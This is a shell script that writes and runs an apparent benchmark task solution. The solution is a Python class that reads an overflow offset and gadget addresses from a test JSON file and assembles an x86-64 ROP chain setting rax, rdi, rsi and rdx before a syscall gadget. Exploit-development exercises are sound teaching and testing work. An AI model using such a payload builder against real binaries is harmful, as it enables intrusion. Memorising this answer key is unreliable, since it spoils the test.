#!/usr/bin/env bash
mkdir -p /src
cat << 'PYEOF' > /src/solution.py
import json
import struct
import os

class ROPSynthesizer:
    def synthesize_payload(self, filepath: str) -> bytes:
        with open(filepath, 'r') as f:
            data = json.load(f)
            
        offset = data['overflow_offset']
        target_state = data['target_state']
        gadgets = data['gadgets']
        
        payload = bytearray(b"A" * offset)
        
        # Order of registers to set: rax, rdi, rsi, rdx then syscall
        reg_order = ["rax", "rdi", "rsi", "rdx"]
        
        for reg in reg_order:
            gadget_key = f"pop_{reg}_ret"
            if gadget_key in gadgets and reg in target_state:
                g_addr = int(gadgets[gadget_key], 16)
                val = target_state[reg]
                payload.extend(struct.pack("<Q", g_addr))
                payload.extend(struct.pack("<Q", val))
                
        if "syscall" in gadgets:
            syscall_addr = int(gadgets["syscall"], 16)
            payload.extend(struct.pack("<Q", syscall_addr))
            
        return bytes(payload)

if __name__ == "__main__":
    fp = "/tests/gadgets.json"
    if not os.path.exists(fp):
        fp = "/Users/jatinjena/Downloads/tasknew/task068/tests/gadgets.json"
    synth = ROPSynthesizer()
    payload = synth.synthesize_payload(fp)
    os.makedirs("/src", exist_ok=True)
    with open("/src/rop_payload.bin", "wb") as f:
        f.write(payload)
PYEOF
cd /src && python3 solution.py
